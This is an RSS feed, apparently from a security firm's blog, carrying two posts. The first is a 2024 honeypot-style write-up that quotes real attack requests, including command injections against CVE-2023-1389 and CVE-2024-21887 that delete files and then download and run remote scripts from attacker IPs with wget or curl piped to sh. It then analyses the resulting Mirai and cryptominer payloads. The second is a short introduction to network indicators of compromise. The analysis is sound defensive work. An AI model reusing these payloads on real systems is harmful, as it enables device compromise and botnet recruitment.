@@ -1,0 +1,157 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>JUMPSEC – Network-Forensics</title>
+    <link>//localhost:1313/categories/network-forensics/</link>
+    <description>Recent content in Network-Forensics on JUMPSEC</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-GB</language>
+    <lastBuildDate>Thu, 16 May 2024 00:00:00 +0000</lastBuildDate>
+    
+	  <atom:link href="//localhost:1313/categories/network-forensics/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+      
+        
+      
+    
+    
+    <item>
+      <title>Adventures and Accidental Honeypots in Network Infrastructure: Unravelling Internet Shenanigans</title>
+      <link>//localhost:1313/articles/2024/05/2024-05-16-adventures-and-accidental-honeypots-in-network-infrastructure-unravelling-internet-shenanigans/</link>
+      <pubDate>Thu, 16 May 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/articles/2024/05/2024-05-16-adventures-and-accidental-honeypots-in-network-infrastructure-unravelling-internet-shenanigans/</guid>
+      <description>
+        
+        
+        &lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/welcome.gif&#34; title=&#34;welcome&#34; alt=&#34;welcome&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;welcome&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Hello World! So, I&amp;rsquo;ve been tinkering with network stuff lately, trying to set up some infrastructure.Turns out that in the process, I made a rookie mistake and left a few ports open to the internet! A few months down the line I took a look and to no one’s surprise my server had been bombarded with all sorts of requests. It was receiving a steady stream of traffic, but not the good kind…think of it more as a steady dose of “internet radiation”. Without realising it I had accidentally turned my server into a honeypot.&lt;/p&gt;
+&lt;p&gt;So, naturally curious I started digging into my server logs and what I found was equal parts fascinating and alarming. Let&amp;rsquo;s just say there&amp;rsquo;s a lot of shady stuff going on out there, from random bots on the site, directory traversal with known path (/.git/config wink wink), to common network appliance enumeration. You name it, they were trying it.&lt;/p&gt;
+&lt;p&gt;But here&amp;rsquo;s where things get interesting: Among all the noise, there are some requests that stand out. Like, seriously weird stuff. It&amp;rsquo;s like people are trying to target anything and everything they can get their hands on.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Sample 0:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image11.png&#34; title=&#34;image11&#34; alt=&#34;image11&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image11&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;And sometimes they are nice enough to actually tell you who they are 🙂&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Sample 1:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image12.png&#34; title=&#34;image12&#34; alt=&#34;image12&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image12&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;From the looks of this particular request it’s already got some bash looking code in the payload. Let’s convert the URL encoding to make it more readable.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;/cgi-bin/luci/;stok=/locale?form=country&amp;amp;operation=write&amp;amp;country=$(rm -rf *; cd /tmp; wget http://94.156.79.129/tenda.sh; chmod 777 tenda.sh; ./tenda.sh)&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;This resembles a command injection attack on OpenWRT routers running LuCI web interface (/cgi-bin/luci/). After a bit of googling, this actually targets routers vulnerable to CVE-2023-1389 as an initial step to breach the perimeter. Then proceed to download another bash script payload (tenda.sh), set it up and execute the script.&lt;/p&gt;
+&lt;p&gt;Unfortunately, at the time of investigation, the hosted script is no longer available. But fear not, Google to the rescue! It looks like someone has already uploaded the script to any.run. This gives us an opportunity to dig deeper into what the attack is capable of.&lt;/p&gt;
+&lt;h6&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image9.png&#34; title=&#34;image9&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image9&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;em&gt;Content of tenda.sh script.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image9content-of-tendash-script&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#image9content-of-tendash-script&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image10.png&#34; title=&#34;image10&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image10&lt;/figcaption&gt;
+  &lt;/figure&gt;redtail binary packed with the late version of UPX 3.94. (3.94 released in 12th May 2017)&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image10redtail-binary-packed-with-the-late-version-of-upx-394-394-released-in-12th-may-2017&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#image10redtail-binary-packed-with-the-late-version-of-upx-394-394-released-in-12th-may-2017&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;Upon initial inspection, it looks like a script that contacts the C2 server and downloads then executes the payloads in various CPU architectures. Readers with a keen eye may have already spotted that this behaviour is highly similar to the propagation of the infamous Mirai botnet.&lt;/p&gt;
+&lt;p&gt;Hexdump functionality on any.run allows us to inspect the payload binary file, which gives us some hints to unpack the executable with UPX. Let’s grab the binary file and dissect it further locally (do this at your own risk, it is highly recommended to deal with malware in an isolated environment).&lt;/p&gt;
+&lt;h6&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image7&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;em&gt;UPX unpacking the binary like a charm.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image7upx-unpacking-the-binary-like-a-charm&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#image7upx-unpacking-the-binary-like-a-charm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image6.png&#34; title=&#34;image6&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image6&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;em&gt;Successfully using UPX to unpack the binary. Section headers are also restored.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image6successfully-using-upx-to-unpack-the-binary-section-headers-are-also-restored&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#image6successfully-using-upx-to-unpack-the-binary-section-headers-are-also-restored&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image16.png&#34; title=&#34;image16&#34; alt=&#34;image16&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image16&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;em&gt;Strings from the mips binary with references to further propagation of Mirai Botnet.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image16strings-from-the-mips-binary-with-references-to-further-propagation-of-mirai-botnet&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#image16strings-from-the-mips-binary-with-references-to-further-propagation-of-mirai-botnet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image14.png&#34; title=&#34;image14&#34; alt=&#34;image14&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image14&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;em&gt;Strings from the mips binary with references to further propagation of Mirai Botnet.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image14strings-from-the-mips-binary-with-references-to-further-propagation-of-mirai-botnet&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#image14strings-from-the-mips-binary-with-references-to-further-propagation-of-mirai-botnet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;Luckily there are no anti-unpacking measures in place for the binary, and UPX has worked flawlessly to recover the original binary executable with all the section headers intact. Armed with the new information from the unpacked binary, it seems to be leveraging SSDP multicast packets to further identify devices on the network using DIAL protocol. The XML soap request seems to contain payload for further exploitation on vulnerable Huawei routers (CVE-2017-17215), which confirms the malware is attributed to Mirai botnet propagation.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Sample 2:&lt;/strong&gt; &lt;/p&gt;
+&lt;h3&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image5.png&#34; title=&#34;image5&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image5&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image5&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#image5&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;/api/v1/totp/user-backup-code/../../license/keys-status/;curl http://94.156.79.60/iv.sh | sh || wget -O- http://94.156.79.60/iv.sh | sh;&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Next up is this specimen. This request again resembles a command injection attack. However, this time it’s targeting the Ivanti Connect Secure web component vulnerable to CVE-2024-21887(/api/v1/totp/user-backup-code/), gaining a foothold and then downloading and executing the iv.sh script by piping it to sh(shell command interpreter).&lt;/p&gt;
+&lt;p&gt;Again, the hosted script was no longer available at the time of investigation. Fortunately, thanks to the amazing cyber community, someone has also uploaded the sample onto any.run for further analysis.&lt;/p&gt;
+&lt;h6&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image4.png&#34; title=&#34;image4&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image4&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;em&gt;Content of iv.sh script&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image4content-of-ivsh-script&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#image4content-of-ivsh-script&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image1-1.png&#34; title=&#34;image1 1&#34; alt=&#34;image1 1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image1 1&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;em&gt;redtail binary packed with the late version of UPX 4.23. Suggesting that the payload was generated fairly recently (4.2.3 released on 27th March 2024)&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image1-1redtail-binary-packed-with-the-late-version-of-upx-423-suggesting-that-the-payload-was-generated-fairly-recently-423-released-on-27th-march-2024&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#image1-1redtail-binary-packed-with-the-late-version-of-upx-423-suggesting-that-the-payload-was-generated-fairly-recently-423-released-on-27th-march-2024&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image15.png&#34; title=&#34;image15&#34; alt=&#34;image15&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image15&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image13.png&#34; title=&#34;image13&#34; alt=&#34;image13&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image13&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image15image13&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#image15image13&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image17-1.png&#34; title=&#34;image17 1&#34; alt=&#34;image17 1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image17 1&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image2&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;em&gt;Strings from the redtail binary with loads of reference to crypto mining operations&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image17-1image2strings-from-the-redtail-binary-with-loads-of-reference-to-crypto-mining-operations&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#image17-1image2strings-from-the-redtail-binary-with-loads-of-reference-to-crypto-mining-operations&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;Running this script will again contact the C2 server, downloading and executing a version of binary payload based on the CPU architecture of the compromised device. The name of the binary “redtail” might have given away the type of malware: &lt;em&gt;Cryptominers!&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Inspecting the strings after unpacking the binary also confirms this theory.&lt;/p&gt;
+&lt;p&gt;So, what have we learned? There is a lot of noise around the dangers of ports open to the internet when we are talking about cyber security. For some who have yet to open a port(s) and watch what happens this might seem a bit dramatic. However, your exposed services are constantly being targeted by all kinds of attacks! Remediating this issue is simple: place the web service behind some form of proxy or firewall, whether that be at the host, application or cloud level. I like Cloudflare proxy, and I ensure to whitelist the exposed ports to Cloudflare listed proxies IP addresses. Fun fact: you only need to do one of the 15 ranges listed on their website and it will work.&lt;/p&gt;
+&lt;p&gt;Until next time! Stay safe out there ;)&lt;/p&gt;
+&lt;h2&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/x17K5U4.gif&#34; title=&#34;x17K5U4&#34; alt=&#34;x17K5U4&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;x17K5U4&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;x17k5u4&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#x17k5u4&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;But also, here’s a list of more trivial ones that were picked up:&lt;/p&gt;
+&lt;p&gt;[table id=5 /]&lt;/p&gt;
+&lt;h2&gt;References:&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://openwrt.org/docs/guide-user/luci/start&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://openwrt.org/docs/guide-user/luci/start&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.greynoise.io/blog/active-exploitation-attempts-cve-2023-1389-against-tp-link-archer-gigabit-internet-routers&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.greynoise.io/blog/active-exploitation-attempts-cve-2023-1389-against-tp-link-archer-gigabit-internet-routers&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2023/4/21/tp-link-wan-side-vulnerability-cve-2023-1389-added-to-the-mirai-botnet-arsenal&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.zerodayinitiative.com/blog/2023/4/21/tp-link-wan-side-vulnerability-cve-2023-1389-added-to-the-mirai-botnet-arsenal&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://answers.microsoft.com/en-us/windows/forum/all/ssdp-messages/ba8f36d0-6b4a-4735-84f9-db25e273c71f&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://answers.microsoft.com/en-us/windows/forum/all/ssdp-messages/ba8f36d0-6b4a-4735-84f9-db25e273c71f&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/43414&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.exploit-db.com/exploits/43414&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-21887&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-21887&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://developers.cloudflare.com/fundamentals/concepts/cloudflare-ip-addresses/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://developers.cloudflare.com/fundamentals/concepts/cloudflare-ip-addresses/&lt;/a&gt;&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>Short introduction to Network Forensics and Indicators of Compromise (IoC)</title>
+      <link>//localhost:1313/articles/2016/06/2016-06-28-short-introduction-network-forensics-indicators-compromise-ioc/</link>
+      <pubDate>Tue, 28 Jun 2016 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/articles/2016/06/2016-06-28-short-introduction-network-forensics-indicators-compromise-ioc/</guid>
+      <description>
+        
+        
+        &lt;p&gt;“&lt;em&gt;Indicator of compromise (IOC) in computer forensics is an artifact observed on a network or in an operating system that with high confidence indicates a computer intrusion. Typical IOCs are virus signatures and IP addresses, MD5 hashes of malware files or URLs or domain names of botnet command and control servers. After IOCs have been identified in a process of incident response and computer forensics, they can be used for early detection of future attack attempts using intrusion detection systems and antivirus software.&lt;/em&gt;” &lt;em&gt;Wikipedia&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Hello w0rld! In this post I am planning to do a brief introduction into network forensics and how network monitoring can be used to identify successful attacks. Network monitoring is essential in order to identify reconnaissance activities such as port scans but also for identifying successful attacks such as planted malware (such as ransomware) or spear-phishing. Generally when doing network forensics the network footprint is of significant importance since it allows us to replicate the timeline of events. With that said, network footprint can still be obscured/hidden by using cryptographic means such as point-2-point encryption. Even if you can’t see the actual traffic because it is encrypted, what you can see is the bandwidth load which might be an IoC.&lt;/p&gt;
+&lt;p&gt;In incident response the first step is the time that is needed for the attack realization. If the attack is not realized then of course there is no ‘incident response’ (doh!). There is a list of things that the analyst should go over in order to try to identify if an attack was successful. The list is not definite and there are far more things that need to be checked than those discussed here. Whether an attack is targeted or non-targeted, if it is utilizing the Internet connection in any way it will leave network footprints behind. In targeted attacks we see things like spear-phishing and USB planting that quite often are targeting susceptible individuals with lack of security awareness. Non-targeted attacks might include attack vectors such as malware, ransomware, malicious javascripts, flash exploits, etc. This is not exhausting since flash exploits and malicious javascripts can be used also in a targeted fashion. By identifying the Indicators of Compromise (IoC), we can have briefly describe each attack vector as follows depending on the network footprint that will have:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;IP addresses&lt;/li&gt;
+&lt;li&gt;domain names&lt;/li&gt;
+&lt;li&gt;DNS resolve requests/response&lt;/li&gt;
+&lt;li&gt;downloadable malicious content (javascripts, flash, PDF files with embedded scripts, DOCX with Macros enabled)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;There are also indicators coming out from behavioural analysis. For example a malware which contacts a Command &amp;amp; Control server will ‘beacon’ in a timely (usually) fashion. This ‘beaconing’ behaviour can be identified by monitoring spikes of specific traffic or bandwidth utilisation of a host. Moreover it can be spotted by monitoring out-of-hours behaviour since a host shouldn’t send data except of X type (which is legit) or shouldn’t be sending any data at all. Ransomware will encrypt all accessible filesystems/mounted drives and will ask (guess what!?) for money! Most likely it will be downloaded somehow or will be dropped by exploit kits or other malware. Sometimes it is delivered through email attachments (if mail administrator has no clue!). As stand-alone ‘version’ ransomware comes in portable executable (PE file) format. However variants of Cryptolocker are employing even PowerShell for doing so. In order to detect them we need a way to extract the files from the network dump. There are couple of tools that does this such as foremost but it is also possible to do it ‘manually’ through wireshark by exporting the objects. This assumes that the file transfer happened through an unencrypted channel and not under SSL. Malware might serve many different purposes such as stealing data, utilizing bandwidth for DDoS, or used as a ‘dropper’ where a ransomware is pushed. One of the more concerning is turning a compromised host into a zombie computer. Fast flux malware have numerous IPs associated with a single FQDN whereas domain flux malware have multiple FQDN per single IP. The latter is not ideal for malware authors since this IP will be easily identified and traffic will be dropped (a bit more about &amp;lsquo;&lt;em&gt;sinkhole&lt;/em&gt;&amp;rsquo; in the next paragraph!). Assuming that we are after a fast flux malware that uses a C&amp;amp;C, then there are ways to locate the malware by looking for beaconing. Quite often these malware make use of DGAs (Domain Generation Algorithms) which basically hide the C&amp;amp;C IP behind a series of different domain names. Malware that uses DGA are actively avoiding ‘sinkhole’ which allows ISPs to identify the malicious IP (C&amp;amp;C) and leading to the ‘blackhole’ of the traffic, shunning the communication of the infected system with it. An infected host will attempt to resolve (through DNS) a series of domain names acquired from the DGAs, This behaviour will lead to lots of ‘Non-Existent’ &lt;em&gt;NX&lt;/em&gt; responses from the name server back to the infected machine. Monitoring the number of &lt;em&gt;NX&lt;/em&gt; responses might help us identify infected systems. Moreover monitoring the DNS queries should also help.&lt;/p&gt;
+&lt;p&gt;In a latter post I will publish a small script that I am using for looking for IoC.&lt;/p&gt;
+&lt;p&gt;[caption id=&amp;ldquo;attachment_217&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;300&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/06/options.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/options-300x133.png&#34; alt=&#34;Main menu&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Script under development ;)[/caption]&lt;/p&gt;
+
+      </description>
+    </item>
+    
+  </channel>
+</rss>
